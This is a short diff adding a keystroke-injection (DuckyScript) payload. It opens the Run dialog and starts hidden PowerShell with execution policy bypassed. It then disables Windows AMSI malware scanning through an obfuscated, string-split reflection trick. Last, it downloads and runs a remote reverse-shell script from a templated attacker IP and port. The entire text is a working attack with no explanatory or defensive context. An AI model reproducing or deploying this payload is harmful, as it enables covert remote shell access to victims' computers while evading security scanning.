@@ -1,0 +1,9 @@
+GUI r
+DELAY 500
+STRING powershell -NoP -NonI -W Hidden -Exec Bypass
+ENTER
+DELAY 500
+STRING [Ref].Assembly.GetType('Sy'+'stem.Managem'+'ent.Aut'+'omation.Am'+'s'+'iUt'+'ils').GetField('a'+'m'+'si'+'In'+'itFa'+'iled','No'+'nPub'+'lic,Static').SetValue(\$null,\$true)
+ENTER
+STRING IEX (New-Object Net.WebClient).DownloadString('http://${reverse_ip}:${listen_port}/Invoke-PowerShellTcpOneLine.ps1')
+ENTER
